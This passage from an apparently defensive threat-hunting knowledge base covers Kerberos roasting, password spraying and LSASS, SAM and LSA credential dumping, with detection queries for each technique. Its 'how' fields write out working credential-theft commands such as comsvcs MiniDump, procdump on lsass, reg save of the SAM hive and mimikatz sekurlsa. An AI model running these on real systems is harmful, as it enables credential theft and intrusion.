benign when a known account permanently lacks preauth for legacy device/app compat and authenticates from its usual host during business hours.","hunt":[{"plat":"Sentinel","t":"4768 with no pre-auth (PreAuth=0)+RC4 against an SPN-bearing account; SPN+preauth-off combo=bad / normal service TGT=benign","q":"let spnAccts = SecurityEvent | where TimeGenerated > ago(7d) | where EventID == 4769 | distinct TargetUserName;\nSecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768 and TicketEncryptionType in (\"0x17\",\"0x18\")\n| extend PreAuthType = tostring(extract(@\"PreAuthType\\D+(\\d+)\", 1, Properties))  // confirm PreAuthType parse in your tenant\n| where PreAuthType == \"0\"\n| where TargetUserName in (spnAccts)\n| summarize Reqs=count() by TargetUserName, IpAddress, Computer\n| sort by Reqs desc"},{"plat":"Sentinel","t":"4738 enabling DONT_REQUIRE_PREAUTH; UAC flip to prep roasting=bad / legit legacy config change=benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4738\n| where Properties has_any (\"DONT_REQUIRE_PREAUTH\",\"Don't Require Preauth\",\"'Don't Require Preauth' - Enabled\")\n| project TimeGenerated, Computer, SubjectUserName, TargetUserName, Properties\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"LogScale","t":"Rubeus/GhostSPN abusing no-preauth = black / ordinary TGT tooling = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Rubeus.*(kerberoast|asktgs).*\\/nopreauth|nopreauth|GhostSPN)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=hits))"},{"plat":"Identity Protection","t":"AS-REQ with PreAuthType=0 against an SPN account (4768) is DC-only","q":"// Falcon Identity Protection detection: AS-REQ Kerberoasting without pre-auth (4768 PreAuthType=0 on SPN accounts, RC4 etype). Track 4738 DONT_REQ_PREAUTH toggles. No host EDR footprint."}]},{"name":"AS-REP Roasting","aka":"AS-REP Cracking / DONT_REQ_PREAUTH abuse","phase":"credaccess","group":"Kerberos","mitre":"T1558.004","cve":"","sev":"High","summary":"Send AS-REQ to accounts with Kerberos pre-authentication disabled and brute-force offline the encrypted portion of the returned AS-REP (encrypted with the user's password key) to recover the password.","how":"Enumerate accounts with DONT_REQ_PREAUTH set using the LDAP filter (userAccountControl:1.2.840.113556.1.4.803:=4194304). Even without credentials (given a username list), send AS-REQ, obtain AS-REP, and crack with hashcat -m 18200 (RC4). Enumeration is easy with any low-privilege domain account, but attempts are also possible unauthenticated via username guessing.","tools":"Rubeus asreproast, impacket GetNPUsers.py, PowerView Get-DomainUser -PreauthNotRequired, Kerbrute, hashcat -m 18200 (AS-REP RC4)","detect":"Detect Event ID 4768 requests with Pre-Authentication Type=0 (no pre-auth) and RC4 encryption type. Legitimate users rarely authenticate without pre-auth, so an AS-REQ against such accounts is itself a high-fidelity signal. Enumeration across multiple accounts in a short window is also an indicator.","events":"4768 (Pre-Auth Type=0, Encryption Type 0x17)","mitigate":"Enable pre-authentication on all accounts (remove DONT_REQ_PREAUTH), and regularly inventory and remove accounts with this flag. Enforce strong passwords and AES encryption, and set the flag on honey accounts as a detection trap.","triage":"On the DC, aggregate 4768 with Pre-Authentication Type=0 and Encryption Type 0x17 (RC4) by source IP/client address. It is malicious if a prior LDAP enumeration of PreauthNotRequired accounts (userAccountControl:1.2.840.113556.1.4.803:=4194304, seen as 4662) precedes it and a single source pulls AS-REPs for several preauth-disabled accounts in a short window. It is benign when a few known legacy preauth-disabled accounts authenticate normally from their usual hosts, or the activity maps to a sanctioned pentest.","hunt":[{"plat":"Sentinel","t":"4768 AS-REQ with no pre-auth (PreAuth=0) and RC4; a request to a preauth-disabled account is itself high-fidelity=bad / normal AES auth=benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where TicketEncryptionType in (\"0x17\",\"0x18\")\n| extend PreAuthType = tostring(extract(@\"PreAuthType\\D+(\\d+)\", 1, Properties))  // confirm PreAuthType parse in your tenant\n| where PreAuthType == \"0\"\n| summarize Reqs=count(), Accounts=make_set(TargetUserName, 20), Distinct=dcount(TargetUserName) by IpAddress, Computer\n| sort by Distinct desc"}],"huntcs":[{"plat":"LogScale","t":"Rubeus asreproast / GetNPUsers run = black / normal Kerberos client = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(asreproast|GetNPUsers(\\.py)?|Rubeus.*asrep)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=hits))"},{"plat":"Identity Protection","t":"AS-REQ PreAuth=0 + RC4 against DONT_REQ_PREAUTH accounts (4768) is DC-only","q":"// Falcon Identity Protection detection: AS-REP Roasting (4768 PreAuthType=0 with RC4 etype 0x17 across DONT_REQ_PREAUTH accounts; multi-account enum in short window). DC-only telemetry."}]},{"name":"Kerberos Pre-Auth Brute-Force / Password Spraying","aka":"Kerbrute / AS-REQ password spray, user enumeration","phase":"credaccess","group":"Kerberos","mitre":"T1110.003","cve":"","sev":"High","summary":"Abuse the design where AS-REQ pre-authentication (PA-ENC-TIMESTAMP) uses a password-derived key, using KDC responses (success/failure/error codes) to enumerate valid usernames or spray a few passwords. Faster than NTLM and easier to avoid lockout.","how":"Sending a username-only AS-REQ to TCP/UDP 88 returns KDC-ERR-PREAUTH-REQUIRED (valid user) or KDC-ERR-C-PRINCIPAL-UNKNOWN (invalid), enabling unauthenticated user enumeration. Then spray a common password (e.g. Season2026!) across all users; a success returns an AS-REP. Limit to one attempt per user to stay under the account lockout threshold.","tools":"Kerbrute (userenum / passwordspray), Rubeus brute, NetExec kerberos, MSF, Spray365","detect":"Detect a surge of Event ID 4768, especially Result Code 0x6 (unknown principal/enumeration) or 0x18 (pre-auth failure = wrong password), spreading from a single source IP across many accounts. Also correlate spikes in 4771 (pre-auth failure) and low-frequency, distributed attempts over time (characteristic of spraying).","events":"4768, 4771 (Failure Code 0x18), 4776, 4740(ロックアウト)","mitigate":"Deploy a strong password policy, MFA, and smart lockout, and restrict anomalous Kerberos source IPs at the network level. Monitor honey-account attempts, monitor authentication failure rates with SIEM correlation, and prohibit external exposure of KDC port 88.","triage":"On the DC, time-series aggregate 4768/4771 by source IP, hunting a single IP fanning 4771 Failure Code 0x18 (bad password) or 4768 Result Code 0x6 (unknown principal = enumeration) across many distinct accounts, correlated with 4776 and 4740 lockouts. It is malicious if one-to-few attempts per account are spread low-frequency across the whole staff, timed to shift-start or password-expiry cycles. It is benign when a VPN/proxy NAT aggregates many users, an expired-password service/scheduled task loops failures, or a monitoring agent has an auth mismatch — source and accounts stay fixed and explainable.","hunt":[{"plat":"Sentinel","t":"4768/4771 failures from one source spread across many accounts; 0x18(bad pwd)/0x6(unknown principal enum) fan-out=bad / one user mistyping=benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4768, 4771)\n| where Status in (\"0x6\",\"0x18\") or SubStatus in (\"0x6\",\"0x18\")\n| summarize Fails=count(), Accounts=dcount(TargetUserName), Sample=make_set(TargetUserName, 15) by IpAddress, bin(TimeGenerated, 15m)\n| where Accounts > 10\n| sort by Accounts desc"},{"plat":"MDI","t":"Kerberos pre-auth failures from one device across many accounts; Kerbrute-style low-and-slow spray=bad / workstation re-logon=benign","q":"IdentityLogonEvents\n| where Timestamp > ago(1d)\n| where Protocol == \"Kerberos\" and ActionType == \"LogonFailed\"\n| summarize Fails=count(), Accounts=dcount(AccountName), Sample=make_set(AccountName, 15) by IPAddress, DeviceName, bin(Timestamp, 30m)\n| where Accounts > 10\n| sort by Accounts desc"}],"huntcs":[{"plat":"Event Search","t":"kerbrute-style spray tool execution = black / individual logon = white","q":"event_simpleName=ProcessRollup2\n| where like(FileName,\"%kerbrute%\") OR like(CommandLine,\"%kerbrute%\") OR like(CommandLine,\"%passwordspray%\") OR like(CommandLine,\"%bruteuser%\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Event Search","t":"One host fanning many AS-REQ to DC:88 = spray black / joined PC's steady 88 = white","q":"event_simpleName=NetworkConnectIP4 RemotePort=88\n| stats count as conns, dc(RemoteAddressIP4) as dcs by aid, ComputerName, ContextBaseFileName\n| where conns > 100"}]},{"name":"Timeroasting","aka":"NTP authentication roast / MS-SNTP computer account roasting","phase":"credaccess","group":"Kerberos","mitre":"T1110, T1552","cve":"","sev":"Medium","summary":"Abuse the design where Windows authenticated NTP (MS-SNTP) computes the response MAC from the computer account's NTLM hash (MD5), collecting computer account hashes for offline cracking with neither pre-authentication nor domain credentials.","how":"From an unauthenticated, non-domain-joined position, send an NTP request to a DC (NTP server) with the computer account's RID in the extended authentication field. The DC responds with a MAC based on that account's MD5 (NTLM hash), which is collected and cracked with hashcat (mode 31300). By brute-forcing RIDs, all computer account hashes can be enumerated. Computer/trust accounts with weak passwords are the targets.","tools":"timeroast.py (SecuraBV), hashcat -m 31300, カスタムNTPクライアント","detect":"Since this rarely surfaces in conventional Kerberos events, monitor for anomalous volumes of authenticated SNTP requests to the DC's NTP/UDP 123 and consecutive RID-specification patterns in network/firewall logs. Traffic where a single source elicits responses for many distinct computer RIDs is an indicator.","events":"ネットワークログ(UDP 123 MS-SNTP), 標準Kerberosイベントには非出現","mitigate":"Computer accounts normally have auto-generated strong passwords, but eliminate trust accounts with manually set or old weak passwords. Limit DC NTP authentication (MS-SNTP) to the necessary scope, control access to UDP 123, and where possible disable authenticated NTP and migrate to secure time synchronization.","triage":"Monitor the DC's UDP/123 via network/firewall/NetFlow for MS-SNTP requests carrying the extended authentication field (computer-account RID), watching for one source hitting many sequential distinct RIDs at volume. Since it leaves no standard Kerberos event, it is malicious when a single non-time-client source brute-forces many RIDs via MS-SNTP responses in a short window. It is benign for normal w32time/NTP sync from domain PCs and network gear or a monitoring host's time polling, with no RID brute-forcing.","hunt":[{"plat":"MDE","t":"Non-w32time process flooding DC UDP123 with SNTP; authenticated SNTP with sequential RIDs=bad / OS time sync (svchost/w32time)=benign","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 123 and Protocol == \"Udp\"\n| where InitiatingProcessFileName !in~ (\"svchost.exe\",\"w32time.exe\",\"VBoxService.exe\",\"vmtoolsd.exe\")\n| summarize Reqs=count(), DCs=dcount(RemoteIP) by DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, RemoteIP\n| where Reqs > 50\n| sort by Reqs desc"}],"huntcs":[{"plat":"Event Search","t":"Non-w32time proc hammering DC UDP/123 = Timeroast black / svchost NTP sync = white","q":"event_simpleName=NetworkConnectIP4 RemotePort=123 Protocol=17\n| stats count as ntp_reqs, dc(RemoteAddressIP4) as targets by aid, ComputerName, ContextBaseFileName\n| where ntp_reqs > 50 AND ContextBaseFileName!=\"svchost.exe\""}]},{"name":"Trustroasting","aka":"trust account roast / inter-realm TGT cracking","phase":"credaccess","group":"Kerberos","mitre":"T1558","cve":"","sev":"Medium","summary":"A variant targeting the shared key of the trust account (TDO) used for domain/forest trusts with Kerberoast/AS-REP-like techniques, attempting to recover the trust key offline from inter-realm TGT encryption material.","how":"Against the trust account representing the partner domain of a trust relationship (e.g. the inter-realm key equivalent to DOMAIN$), obtain ticket material via SPN or via AS-REP and crack it offline. The prerequisite is a domain-authenticated account. On success, forge a fake inter-realm TGT (trust ticket) using the trust key and move laterally into the trusted domain.","tools":"Rubeus, impacket, hashcat, 信頼アカウント列挙用LDAPクエリ","detect":"Monitor 4769/4768 requests against trust accounts (trust objects whose names end in $), especially RC4 encryption types. TGS requests targeting trust accounts, which normally do not occur, are a high-fidelity signal.","events":"4769, 4768 (信頼アカウント対象, Enc Type 0x17)","mitigate":"Rotate trust keys regularly, move trusts to AES, remove unnecessary trusts, and enable SID filtering / selective authentication. Prioritize monitoring of Kerberos requests targeting trust accounts.","triage":"On the DC, review 4768/4769 for requests whose Service Name or Account Name is a trailing-$ trust (inter-realm) account, emphasizing Encryption Type 0x17 (RC4). Because TGS/AS requests targeting trust accounts almost never occur in normal ops, it is malicious when a single low-priv account/host pulls encrypted material for a trust account, followed by suspected offline cracking / lateral movement. It is benign for legitimate cross-realm authentication, trust health checks, or normal inter-DC replication/trust validation with no RC4 forcing or single-source concentration.","hunt":[{"plat":"Sentinel","t":"4768/4769 RC4(0x17) targeting trailing-$ trust accounts; TGS/TGT to a trust account normally never happens=bad / computer AES auth=benign (verify trust vs computer)","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4768, 4769)\n| where TicketEncryptionType == \"0x17\"\n| where TargetUserName endswith \"$\"\n| summarize Reqs=count(), Accts=make_set(TargetUserName, 20) by EventID, IpAddress, Computer\n| where Reqs > 0\n| sort by Reqs desc  // triage: confirm listed $-accounts are inter-realm trust objects, not member computers"}],"huntcs":[{"plat":"LogScale","t":"Rubeus/GetUserSPNs aimed at trailing-$ trust accounts = black / normal SPN enum = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Rubeus.*(kerberoast|tgtdeleg)|GetUserSPNs(\\.py)?.*\\$|trustroast|-target-domain)/i\n| groupBy([ComputerName, UserName, CommandLine], function=count(as=hits))"},{"plat":"Identity Protection","t":"RC4 TGS/TGT (4769/4768) requested for trust accounts (trailing-$) is DC-only","q":"// Falcon Identity Protection detection: Trustroasting (4769/4768 with RC4 etype 0x17 targeting inter-realm trust accounts). Anomalous by nature; no attacker-host EDR footprint."}]},{"name":"Kerberos Encryption Downgrade (RC4 Downgrade)","aka":"etype downgrade / RC4-HMAC forcing","phase":"credaccess","group":"Kerberos","mitre":"T1558.004","cve":"","sev":"High","summary":"An auxiliary attack where the attacker presents only RC4-HMAC (etype 23) as the supported encryption type in AS-REQ/TGS-REQ, forcing tickets to be encrypted with weaker RC4 instead of AES to dramatically lower the cracking cost of Kerberoast/AS-REP Roast.","how":"When running Kerberoast/AS-REP Roast, set the request's etype field to RC4 only (in Rubeus, /tgtdeleg is an actual downgrade method that forces RC4 even on AES-enabled accounts; /rc4opsec is the opposite, an OPSEC option limited to non-AES accounts that avoids detection of RC4 requests. Note that on Windows Server 2019+, tgtdeleg may fail because AES is still returned for AES-enabled accounts). If the KDC still permits RC4, the ticket is encrypted with an RC4 key derived from the NTLM hash instead of the AES key, speeding up brute force with hashcat -m 13100/18200. The prerequisite is that RC4 is not disabled in the domain.","tools":"Rubeus (/tgtdeleg=RC4強制, /rc4opsec=AES非対応アカウント限定のOPSEC), mimikatz, impacket(指定etype), hashcat -m 13100/18200","detect":"Monitor Event ID 4768/4769 requests whose Ticket Encryption Type is 0x17 (RC4-HMAC) or 0x18. RC4 requests observed in an AES-standardized environment are a direct indicator of a downgrade attack; detect them as deviations from the baseline (normally 0x12 AES256).","events":"4768/4769 (Encryption Type 0x17=RC4-HMAC, 0x18=RC4-HMAC-EXP)","mitigate":"Restrict Kerberos allowed encryption types to AES128/256 only via group policy and fully disable RC4/DES (msDS-SupportedEncryptionTypes). Identify legacy dependencies and migrate in stages, and alert on RC4 requests. Reset passwords to reliably generate AES keys for KRBTGT and service accounts.","triage":"On the DC, extract 4768/4769 with Ticket Encryption Type 0x17 (RC4-HMAC)/0x18 as deviations from the AES baseline (normally 0x12 = AES256), keyed by account and client address. It is malicious when RC4 is forced against an AES-capable account and the origin host's Sysmon EID1 correlates with rubeus.exe /tgtdeleg or etype-specifying impacket/mimikatz. It is benign in known cases where legacy OS/apps, old service accounts, or certain trusts/appliances can only offer RC4, with a fixed target and time window (still log it as an AES-remediation item).","hunt":[{"plat":"Sentinel","t":"Accounts that normally use AES(0x12/0x11) also issuing RC4(0x17/0x18) in the same window; baseline deviation=bad / consistently-RC4 legacy=benign","q":"SecurityEvent\n| where TimeGenerated > ago(7d)\n| where EventID in (4768, 4769)\n| summarize AES=countif(TicketEncryptionType in (\"0x12\",\"0x11\")), RC4=countif(TicketEncryptionType in (\"0x17\",\"0x18\")) by TargetUserName\n| where AES > 0 and RC4 > 0\n| extend RC4Ratio = round(todouble(RC4) / (AES + RC4), 2)\n| sort by RC4 desc"}],"huntcs":[{"plat":"Event Search","t":"Tooling forcing RC4 / tgtdeleg = downgrade black / standard AES client = white","q":"event_simpleName=ProcessRollup2\n| where like(CommandLine,\"%/rc4%\") OR like(CommandLine,\"%tgtdeleg%\") OR like(CommandLine,\"%enctype:rc4%\") OR like(CommandLine,\"%/nowrap%rc4%\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"0x17/0x18 ticket etype in an AES256(0x12) baseline realm = downgrade; DC-only","q":"// Falcon Identity Protection detection: Kerberos encryption downgrade (4768/4769 TicketEncryptionType 0x17/0x18 deviating from AES256 baseline). Not collected by host EDR."}]},{"name":"LSASS Memory Dump via comsvcs.dll MiniDump","aka":"LOLBin LSASS dump / rundll32 MiniDump","phase":"credaccess","group":"Host / Local","mitre":"T1003.001","cve":"","sev":"Critical","summary":"Abuse the MiniDump export of the OS-standard DLL (comsvcs.dll) to dump LSASS process memory to disk and steal plaintext / NTLM hashes / Kerberos tickets.","how":"Prerequisite: local administrator with SeDebugPrivilege on the target host. Steps: obtain the LSASS PID and run rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> C:\\temp\\lsass.dmp full. Exfiltrate the generated .dmp offline and analyze on the attacker side with mimikatz (sekurlsa::minidump then sekurlsa::logonPasswords) or pypykatz. Easy to evade AV since no additional signed binary is required.","tools":"rundll32.exe+comsvcs.dll, mimikatz sekurlsa::minidump, pypykatz, tasklist/Get-Process","detect":"Monitor Sysmon EventID 10 (ProcessAccess) for accesses to lsass.exe with GrantedAccess 0x1010/0x1410/0x143a etc. Detect command lines where rundll32.exe runs comsvcs.dll MiniDump as arguments (4688/Sysmon 1). Correlate the process that opened the LSASS handle via EDR.","events":"Sysmon 10, Sysmon 1, 4688, Sysmon 11(dmp生成)","mitigate":"Enable Credential Guard (VBS) to isolate credentials inside LSASS. Enable LSASS RunAsPPL (RunAsPPL=1) for Protected Process Light. Enable the Attack Surface Reduction (ASR) rule 'Block credential stealing from LSASS'. Minimize administrator privileges and enforce tier separation.","triage":"On the target host, review Sysmon EID10 for Target Image=lsass.exe with high-privilege GrantedAccess (0x1010/0x1410/0x143a), keyed by Source Image. It is malicious if Sysmon EID1/4688 shows rundll32.exe invoking comsvcs.dll,MiniDump <PID> ... full, followed by Sysmon EID11 .dmp creation and EDR credential-access on lsass, all in one process lineage and time window. It is benign for legitimate WER/crash dumps, EDR/AV products' own lsass access, or an approved DFIR collection (known admin host, change ticket) with no comsvcs-based rundll32 launch.","hunt":[{"plat":"MDE","t":"rundll32 invoking comsvcs.dll MiniDump against lsass = black / benign COM use = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where FileName =~ \"rundll32.exe\"\n| where ProcessCommandLine has \"comsvcs.dll\" and ProcessCommandLine has_any (\"MiniDump\", \"#24\")\n| where ProcessCommandLine has \"lsass\" or ProcessCommandLine matches regex @\"\\s\\d{3,5}\\s\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine"},{"plat":"MDE","t":"OpenProcess handle to lsass.exe from non-standard caller = black / WER/AV normal = white","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"OpenProcessApiCall\"\n| where FileName =~ \"lsass.exe\"\n| where InitiatingProcessFileName in~ (\"rundll32.exe\", \"powershell.exe\", \"cmd.exe\", \"wscript.exe\", \"mshta.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, AdditionalFields"}],"huntcs":[{"plat":"Event Search","t":"rundll32 running comsvcs.dll MiniDump against lsass = black / legit use of these args is virtually nil = white","q":"event_simpleName=ProcessRollup2 FileName=rundll32.exe CommandLine=\"*comsvcs.dll*\" CommandLine=\"*MiniDump*\"\n| stats count by ComputerName, UserName, ParentBaseFileName, CommandLine\n| sort - count"}]},{"name":"LSASS Dump via ProcDump / Task Manager / Direct Syscalls","aka":"Sysinternals ProcDump LSASS / nanodump / dumpert","phase":"credaccess","group":"Host / Local","mitre":"T1003.001","cve":"","sev":"Critical","summary":"A family of variants that obtain a full memory dump of LSASS using signed Sysinternals procdump or various dumpers. Many implementations use direct syscalls or handle duplication to evade EDR.","how":"Prerequisite: local administrator + SeDebugPrivilege. Dump with a signed binary via procdump.exe -accepteula -ma lsass.exe lsass.dmp. In the GUI, right-click in Task Manager and 'Create dump file'. EDR-evasion variants: nanodump (direct syscall + signature invalidation), dumpert (direct NtReadVirtualMemory call), MirrorDump, HandleKatz (duplicating existing handles), SilentProcessExit (via WerFault). Analyze offline with pypykatz.","tools":"procdump.exe, nanodump, dumpert, HandleKatz, MirrorDump, SilentProcessExit手法, WerFault.exe","detect":"Monitor high-privilege handle acquisition to lsass.exe via Sysmon 10 (procdump/unsigned/anomalous caller). Detect procdump command-line arguments (-ma lsass). For SilentProcessExit, monitor changes to the SilentProcessExit registry key (HKLM\\...\\Image File Execution Options).","events":"Sysmon 10, Sysmon 1/4688, Sysmon 13(レジストリ改変), Sysmon 11","mitigate":"RunAsPPL + Credential Guard. Apply ASR rules. Application control (WDAC/AppLocker) for Sysinternals tools such as procdump. EDR LSASS access protection (tamper protection). Operate with Restricted Admin / Remote Credential Guard.","triage":"On the target host, review Sysmon EID10 for high-privilege handles to lsass.exe, emphasizing Source Image and anomalous caller signature/call stack (unsigned, direct syscalls). It is malicious if Sysmon EID1/4688 shows procdump.exe -ma lsass, followed by EID11 .dmp creation, or EID13 shows SilentProcessExit/GlobalFlag tampering under HKLM\\...\\Image File Execution Options. It is benign for a sanctioned admin/developer procdump troubleshoot (approved, known host), EDR/AV memory inspection, or an app's WER crash dump, with no unsigned dumper, anomalous caller, or IFEO tampering.","hunt":[{"plat":"MDE","t":"procdump-style tool dumping lsass with -ma = black / legit developer dump = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has \"lsass\"\n| where ProcessCommandLine has_any (\"-ma\", \"-mm\", \"/ma\", \"-accepteula\") or FileName has_any (\"procdump\", \"nanodump\", \"dumpert\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, SHA256"},{"plat":"MDE","t":"SilentProcessExit/IFEO registry set for lsass.exe = black / no change = white","q":"DeviceRegistryEvents\n| where Timestamp > ago(1d)\n| where RegistryKey has \"Image File Execution Options\"\n| where RegistryKey has_any (\"SilentProcessExit\", \"lsass.exe\")\n| where RegistryValueName in~ (\"GlobalFlag\", \"ReportingMode\", \"LocalDumpFolder\", \"DumpType\")\n| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine"}],"huntcs":[{"plat":"LogScale","t":"procdump -ma lsass / nanodump / dumpert dumping LSASS = black / rare legit procdump on dev boxes = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(procdump.*-ma\\s+lsass|nanodump|dumpert|-ma\\s+lsass)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=cnt))\n| sort(cnt, order=desc)"},{"plat":"Event Search","t":"SilentProcessExit IFEO key set to dump lsass.exe = black / this key is normally never touched = white","q":"event_simpleName=RegSystemConfigValueUpdate RegObjectName=\"*SilentProcessExit*lsass.exe*\"\n| stats count by ComputerName, RegObjectName, RegValueName, RegStringValue"}]},{"name":"LSASS Dump via mimikatz sekurlsa (live)","aka":"sekurlsa::logonpasswords / pth-material extraction","phase":"credaccess","group":"Host / Local","mitre":"T1003.001","cve":"","sev":"Critical","summary":"Run mimikatz directly on the host to live-extract cleartext passwords, NTLM hashes, Kerberos tickets, and DPAPI master keys from LSASS memory.","how":"Prereq: local admin. Launch mimikatz -> privilege::debug -> sekurlsa::logonpasswords (credentials for all logon sessions), sekurlsa::ekeys (Kerberos AES keys), sekurlsa::tickets (TGT/TGS), sekurlsa::dpapi (master keys). Cleartext is recoverable where WDigest is enabled (legacy OS / UseLogonCredential=1). Fileless variants that run in memory only (Invoke-Mimikatz, Cobalt Strike mimikatz) are also common.","tools":"mimikatz, Invoke-Mimikatz(PowerShell), Cobalt Strike, pypykatz(live)","detect":"Detect mimikatz-specific strings/API calls via AV/EDR. Sysmon 10 lsass access. PowerShell ScriptBlock logging (4104) for Invoke-Mimikatz traces. Anomalous SeDebugPrivilege enablement from an unexpected process.","events":"Sysmon 10, 4104, 4688, 4673(特権呼び出し)","mitigate":"Enforce WDigest disablement (UseLogonCredential=0) and pin it via GPO. Credential Guard / RunAsPPL. ASR rules. Minimize logon sessions; Tier operations that leave no admin credentials resident after interactive logon.","triage":"On the source host pull Sysmon EID 10 for suspicious lsass.exe access (GrantedAccess 0x1010/0x1410/0x1438) and inspect CallTrace (unknown/unsigned modules) and SourceImage. It is a true positive when 4104 ScriptBlock shows Invoke-Mimikatz/DumpCreds strings and 4688/Sysmon EID 1 shows an odd parent (word/outlook/rundll32->powershell) enabling SeDebugPrivilege (4673/4672) for the same user at the same time. It leans benign if the SourceImage is MsMpEng/an EDR sensor or a signed dump tool (procdump, Defender live response, inventory agent) during business hours with a known ops account and no tell-tale strings; read-only access (0x1000) from monitoring is benign.","hunt":[{"plat":"MDE","t":"execution carrying mimikatz-specific strings (sekurlsa::) = black / unrelated cmd = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"sekurlsa\", \"logonpasswords\", \"Invoke-Mimikatz\", \"lsadump::\", \"kerberos::ptt\", \"privilege::debug\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, SHA256"},{"plat":"MDE","t":"ASR blocks/audits LSASS credential theft = black / no detection = white","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType in (\"AsrLsassCredentialTheftBlocked\", \"AsrLsassCredentialTheftAudited\")\n| project Timestamp, DeviceName, ActionType, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine\n| summarize Attempts=count(), Tools=make_set(InitiatingProcessFileName) by DeviceName, bin(Timestamp, 1h)"}],"huntcs":[{"plat":"LogScale","t":"sekurlsa/logonpasswords/Invoke-Mimikatz strings = black / no business process carries these tokens = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(sekurlsa|logonpasswords|Invoke-Mimikatz|privilege::debug|DumpCreds)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=cnt))\n| sort(cnt, order=desc)"}]},{"name":"SAM Hive Dump (local account hashes)","aka":"reg save SAM / secretsdump local / lsadump::sam","phase":"credaccess","group":"Host / Local","mitre":"T1003.002","cve":"","sev":"High","summary":"Obtain the SAM registry hive and SYSTEM (bootkey) to extract NTLM hashes of local accounts. Used for lateral movement of local admins (PtH) and password cracking.","how":"Prereq: local admin. Dump the hives with reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save & reg save HKLM\\SECURITY security.save, then decrypt offline with impacket secretsdump.py -sam sam.save -system system.save LOCAL. Live: mimikatz lsadump::sam. Remote: secretsdump.py DOMAIN/user@host. VSS copies or esentutl can bypass file locks.","tools":"reg.exe save, impacket-secretsdump, mimikatz lsadump::sam, NetExec --sam","detect":"Command lines targeting SAM/SECURITY/SYSTEM with reg.exe save (4688/Sysmon1). Handle access to the SAM/SECURITY hives (4656/4663, when SACL is set). Service creation (7045) or admin$ access from remote secretsdump.","events":"4688/Sysmon 1, 4656/4663, 4657, 7045(リモート時)","mitigate":"Use LAPS to make local admin passwords unique and neutralize PtH lateral movement. Disable/rename the local admin account. Credential Guard does not cover this, so enable SACL auditing on sensitive hives. Block reg save + SAM arguments via EDR.","triage":"On the target host check 4688/Sysmon EID 1 for `reg.exe save` command lines hitting HKLM\\SAM/SYSTEM/SECURITY (or esentutl/vssadmin lock-bypass) and the resulting *.save file in Sysmon EID 11. Correlate SAM/SECURITY hive handle access (4656/4663, if SACL set) to the same process/time; for remote runs match 7045 service creation with 4624 LogonType3 to ADMIN$ to call it black. A single run by a known backup product, forensic acquisition, or imaging tool from an authorized host/account in business hours leans benign.","hunt":[{"plat":"MDE","t":"reg save exporting SAM/SYSTEM/SECURITY hives = black / sanctioned backup = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where FileName =~ \"reg.exe\" and ProcessCommandLine has \"save\"\n| where ProcessCommandLine has_any (\"hklm\\\\sam\", \"hklm\\\\system\", \"hklm\\\\security\", \" sam \", \" security \")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine"},{"plat":"Sentinel","t":"handle/object access to SAM hive file = black / normal SACL I/O = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4656, 4663)\n| where ObjectType == \"File\"\n| where ObjectName has_any (\"\\\\config\\\\SAM\", \"\\\\config\\\\SECURITY\", \"\\\\config\\\\SYSTEM\")\n| where AccessMask has_any (\"0x1\", \"0x20000\", \"0x80000\")\n| summarize Accesses=count() by Account, Computer, ObjectName, bin(TimeGenerated, 1h)\n| where Accesses > 0"}],"huntcs":[{"plat":"LogScale","t":"reg save exporting SAM/SYSTEM/SECURITY hive = black / scoped backup ops = white","q":"#event_simpleName=ProcessRollup2\n| FileName=/reg\\.exe/i\n| CommandLine=/save/i\n| CommandLine=/(hklm\\\\sam|hklm\\\\system|hklm\\\\security|\\bsam\\b)/i\n| groupBy([ComputerName, UserName, ParentBaseFileName, CommandLine], function=count(as=cnt))\n| sort(cnt, order=desc)"}]},{"name":"LSA Secrets Dump","aka":"lsadump::secrets / SECURITY hive secrets","phase":"credaccess","group":"Host / Local","mitre":"T1003.004","cve":"","sev":"High","summary":"Decrypt and steal LSA Secrets (service account cleartext passwords, machine account, DPAPI_SYSTEM, autologon credentials, cache).","how":"Prereq: local admin (SYSTEM-equivalent). impacket secretsdump.py decrypts and outputs LSA secrets from the 